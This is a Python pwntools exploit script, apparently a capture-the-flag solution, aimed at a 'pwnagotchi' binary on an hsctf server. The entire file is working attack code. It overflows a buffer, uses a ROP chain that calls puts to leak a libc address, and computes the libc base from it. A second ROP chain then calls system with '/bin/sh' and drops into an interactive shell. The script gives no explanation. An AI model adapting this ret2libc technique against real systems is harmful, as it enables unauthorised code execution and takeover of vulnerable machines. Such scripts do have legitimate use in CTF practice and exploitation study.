from pwn import *

io = remote('pwn.hsctf.com' ,'5005')
#io = process('./pwnagotchi',env={'LD_PRELOAD':'libc6_2.27.so'})

#gdb.attach(io,'Rb*0x400917')
payload = "A"*20
#payload += p64(0x4007e7)
#payload += p64(0x400801)
#payload += p64(0x400285)

payload += p64(0x4009f3) #pop rdi
payload += p64(0x601050) #got
payload += p64(0x400660) #puts@plt
payload += p64(0x4007e7)
payload += p64(0x400801)
#payload += p64(0x400285)
payload += p64(0x400846) #main


io.sendlineafter(': \n',payload)
io.recvuntil('!\n')
out = io.recvline()
fin = out.encode('hex')
leak =fin[10:12]+fin[8:10]+fin[6:8]+fin[4:6]+fin[2:4]+fin[0:2]
leaked ="0x" +str(leak)
print leaked

leaked=int(leaked,16)
libc_base=leaked-529136
binsh = libc_base+1785498
sys = libc_base+324672

print binsh,sys	
payload2 ='B'*20
payload2 += p64(0x400285)
payload2 += p64(0x4009f3) #pop rdi
payload2 += p64(binsh)
payload2 += p64(sys)

io.sendlineafter(': \n',payload2)



io.interactive()

